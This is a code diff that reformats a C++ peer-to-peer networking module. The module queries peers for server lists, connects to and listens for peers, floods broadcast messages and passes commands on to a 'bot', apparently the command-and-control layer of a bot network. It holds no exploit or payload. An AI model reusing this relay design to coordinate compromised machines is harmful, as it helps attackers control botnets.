@@ -2,57 +2,108 @@
 #include "mainctrl.h"
 #include "p2p.h"
 
-CP2PConn::CP2PConn() { m_pManager=NULL; m_bConnected=false; m_sClientSock=0; m_bGotServer=false; m_bSeeded=false; m_bRunning=true; }
-CP2PConn::~CP2PConn() throw() { m_pManager=NULL; xClose(m_sClientSock); m_bConnected=false; m_bGotServer=false; m_bSeeded=false; m_bRunning=false; join(); }
-void CP2PConn::SetManager(CP2PManager *pManager) { m_pManager=pManager; }
-void CP2PConn::SetServer(const char *szServer, int iPort) { m_sServer.Assign(szServer); m_iPort=iPort; m_bGotServer=true; }
+CP2PConn::CP2PConn()
+{
+    m_pManager=NULL;
+    m_bConnected=false;
+    m_sClientSock=0;
+    m_bGotServer=false;
+    m_bSeeded=false;
+    m_bRunning=true;
+}
+CP2PConn::~CP2PConn() throw()
+{
+    m_pManager=NULL;
+    xClose(m_sClientSock);
+    m_bConnected=false;
+    m_bGotServer=false;
+    m_bSeeded=false;
+    m_bRunning=false;
+    join();
+}
+void CP2PConn::SetManager(CP2PManager *pManager)
+{
+    m_pManager=pManager;
+}
+void CP2PConn::SetServer(const char *szServer, int iPort)
+{
+    m_sServer.Assign(szServer);
+    m_iPort=iPort;
+    m_bGotServer=true;
+}
 const char *CP2PConn::GetServer() { return m_sServer.CStr(); }
 bool CP2PConn::GotServer() { return m_bGotServer; } // Do I have a server set ?
 bool CP2PConn::IsConnected() { return m_bConnected; } // Am I connected ?
 bool CP2PConn::IsRunning() { return m_bRunning; } // Am I running ?
 void CP2PConn::QueryServers()
-{	m_cMsgIface.SendCmd("server_query", "", 0, NULL); // Send a server query command
+{
+    m_cMsgIface.SendCmd("server_query", "", 0, NULL); // Send a server query command
 	// Receive the reply from the server
-	message mMsgReply; if(!m_cMsgIface.RecvCmd(&mMsgReply)) { m_bRunning=false; return; }
+    message mMsgReply;
+    if(!m_cMsgIface.RecvCmd(&mMsgReply)) { m_bRunning=false; return; }
 	char *szServer=strtok(mMsgReply.szContent, " "); // Split it into tokens
-	if(!szServer) g_cMainCtrl.m_cConsDbg.Log(5, "CP2PConn(0x%8.8Xh): Got no servers from query!\n", this);
+    if(!szServer)
+        g_cMainCtrl.m_cConsDbg.Log(5, "CP2PConn(0x%8.8Xh): Got no servers from query!\n", this);
 	while(szServer) // While there are tokens left
 	{	// Add the server to the manager
 		g_cMainCtrl.m_cConsDbg.Log(5, "CP2PConn(0x%8.8Xh): Got server \"%s\"...\n", this, szServer);
-		m_pManager->AddServer(szServer); szServer=strtok(NULL, " "); }
-	if(mMsgReply.szContent) free(mMsgReply.szContent); }
+        m_pManager->AddServer(szServer); szServer=strtok(NULL, " ");
+    }
+    if(mMsgReply.szContent)
+        free(mMsgReply.szContent);
+}
 void CP2PConn::run() throw()
-{	while(!m_pManager) sleep(250); m_bRunning=true; // Wait while we dont have the manager set
+{	while(!m_pManager)
+        sleep(250);
+    m_bRunning=true; // Wait while we dont have the manager set
 
 	// Get the socket
-	m_sClientSock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if(m_sClientSock==-1) return;
+    m_sClientSock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(m_sClientSock==-1)
+        return;
 	g_cMainCtrl.m_cConsDbg.Log(7, "CP2PConn(0x%8.8Xh): Got new socket %d...\n", this, m_sClientSock);
 
 	while(m_bRunning)
 	{	// If not connected and the server is set, connect the socket to the server
 		if(!m_bConnected && m_bGotServer && m_bRunning)
 		{	// Setup sockaddr, resolve host
-			sockaddr_in ssin; in_addr iaddr; hostent *hostent; int iErr;
-			memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
-			ssin.sin_port=htons(m_iPort); iaddr.s_addr=inet_addr(m_sServer.CStr());
-			if(iaddr.s_addr==INADDR_NONE) hostent=gethostbyname(m_sServer.CStr());
-			else hostent=gethostbyaddr((const char*)&iaddr, sizeof(struct in_addr), AF_INET);
+            sockaddr_in ssin;
+            in_addr iaddr;
+            hostent *hostent;
+            int iErr;
+            memset(&ssin, 0, sizeof(ssin));
+            ssin.sin_family=AF_INET;
+            ssin.sin_port=htons(m_iPort);
+            iaddr.s_addr=inet_addr(m_sServer.CStr());
+            if(iaddr.s_addr==INADDR_NONE)
+                hostent=gethostbyname(m_sServer.CStr());
+            else
+                hostent=gethostbyaddr((const char*)&iaddr, sizeof(struct in_addr), AF_INET);
 			if(!hostent) // The host couldn't be resolved, exit
 			{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Can't resolve \"%s\"!\n", this, m_sServer.CStr());
-				m_bGotServer=false; m_bConnected=false; m_bRunning=false; break; }
+                m_bGotServer=false;
+                m_bConnected=false;
+                m_bRunning=false;
+                break;
+            }
 			ssin.sin_addr=*((in_addr*)*hostent->h_addr_list);
 			
 			iErr=connect(m_sClientSock, (sockaddr*)&ssin, sizeof(sockaddr_in));
 			if(iErr==-1) // Connect failed, exit
 			{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Connection to \"%s:%d\" failed!\n", this, m_sServer.CStr(), m_iPort);
-				m_bGotServer=false; m_bConnected=false; m_bRunning=false; break; }
+                m_bGotServer=false;
+                m_bConnected=false;
+                m_bRunning=false;
+                break;
+            }
 			else
 				g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Connection to \"%s:%d\" established!\n", this, m_sServer.CStr(), m_iPort);
 			m_cMsgIface.SetSocket(m_sClientSock); // Tell the message interface what socket to use
 #ifdef WIN32
 			WSAAsyncSelect(m_sClientSock, 0, WM_USER+1, FD_READ);
 #endif
-			m_bConnected=true; }
+            m_bConnected=true;
+        }
 		
 		// Its connected to the server, do stuff now!
 		if(m_bConnected && m_bRunning)
@@ -60,26 +111,36 @@ void CP2PConn::run() throw()
 			if(!m_bSeeded) { m_pManager->QueryServers(); m_bSeeded=true; }
 			// Wait for a message to arrive, we only wait in this thread, CBot is responsible
 			// for sending messages, and runs in the main thread
-			message mMsg; if(m_cMsgIface.RecvCmd(&mMsg))
+            message mMsg;
+            if(m_cMsgIface.RecvCmd(&mMsg))
 			{	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PConn(0x%8.8Xh): Got command \"%s\"...\n", this, mMsg.szCommand);
 			
 				// Its a broadcast message, broadcast to all servers and clients via the
 				// manager, the broadcast function itself checks for dupes, so theres no
 				// loopback in the network
-				if(strstr(mMsg.szIntFlags, "broadcast")) m_pManager->Broadcast(&mMsg);
+                if(strstr(mMsg.szIntFlags, "broadcast"))
+                    m_pManager->Broadcast(&mMsg);
 
 				// Its a message directed to the bot, let the manager distribute it to
 				// its registered targets. The parts that the bot get are szContent and
 				// iContentLength
-				if(!strcmp(mMsg.szCommand, "message")) m_pManager->ForTargets(&mMsg);
+                if(!strcmp(mMsg.szCommand, "message"))
+                    m_pManager->ForTargets(&mMsg);
 
 				// If the message got contents they have to be freed because RecvCmd does
 				// a malloc
-				if(mMsg.szContent) free(mMsg.szContent); }
+                if(mMsg.szContent)
+                    free(mMsg.szContent);
+            }
 			else // The message wasn't correct, or the socket is closed, terminate
-				m_bRunning=false; }
-		Sleep(250); } // Sleep some time, so we don't overload
-	if(m_sClientSock!=-1) xClose(m_sClientSock); m_bRunning=false; }
+                m_bRunning=false;
+        }
+        Sleep(250);
+    } // Sleep some time, so we don't overload
+    if(m_sClientSock!=-1)
+        xClose(m_sClientSock);
+    m_bRunning=false;
+}
 
 CP2PServer::CP2PServer() { m_pManager=NULL; m_bRunning=true; }
 CP2PServer::~CP2PServer() throw() { m_pManager=NULL; m_bRunning=false; join(); }
@@ -87,7 +148,8 @@ void CP2PServer::SetManager(CP2PManager *pManager) { m_pManager=pManager; }
 bool CP2PServer::IsRunning() { return m_bRunning; }
 
 void CP2PServer::run() throw()
-{	m_bRunning=true; while(m_bRunning && m_sListenSock!=-1)
+{	m_bRunning=true;
+    while(m_bRunning && m_sListenSock!=-1)
 	{	// Accept an incoming connection from the shared listen socket
 		sockaddr_in cssin; socklen_t cssin_len=sizeof(cssin);
 		m_sServerSock=accept(m_sListenSock, (sockaddr *)&cssin, &cssin_len);
@@ -138,10 +200,18 @@ void CP2PServer::run() throw()
 	g_cMainCtrl.m_cConsDbg.Log(3, "CP2PServer(0x%8.8Xh): Connection from \"%s\" closed!\n", this, m_sClientIp.CStr()); m_bRunning=false; }
 
 void CP2PManager::Init()
-{	m_lConns.clear(); m_iMaxConns=20; m_iMaxServs=20; m_iNumConns=0; m_iNumServs=0;
+{
+    m_lConns.clear();
+    m_iMaxConns=20;
+    m_iMaxServs=20;
+    m_iNumConns=0;
+    m_iNumServs=0;
 	// Create the shared listen socket on standard port
-	sockaddr_in issin; memset(&issin, 0, sizeof(issin)); issin.sin_family=AF_INET;
-	issin.sin_addr.s_addr=INADDR_ANY; issin.sin_port=htons(P2P_SERVER_PORT);
+    sockaddr_in issin;
+    memset(&issin, 0, sizeof(issin));
+    issin.sin_family=AF_INET;
+    issin.sin_addr.s_addr=INADDR_ANY;
+    issin.sin_port=htons(P2P_SERVER_PORT);
 	m_sListenSock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if(m_sListenSock!=-1) {
 #ifdef WIN32
@@ -157,8 +227,13 @@ void CP2PManager::Deinit()
 void CP2PManager::AddServer(const char *szServer)
 {	char *szServerCopy=(char*)malloc(strlen(szServer)+1); strcpy(szServerCopy, szServer);
 	char *szRealServer=strtok(szServerCopy, ":");
-	char *szPort=strtok(NULL, ":"); if(!szPort) return; int iPort=atoi(szPort);
-	AddServer(szRealServer, iPort); free(szServerCopy); }
+    char *szPort=strtok(NULL, ":");
+    if(!szPort)
+        return;
+    int iPort=atoi(szPort);
+    AddServer(szRealServer, iPort);
+    free(szServerCopy);
+}
 void CP2PManager::AddServer(const char *szServer, int iPort)
 {	// Let the manager think if adding seed, loop through connections after that
 	CString *sServer=new CString; bool bDupe=false;
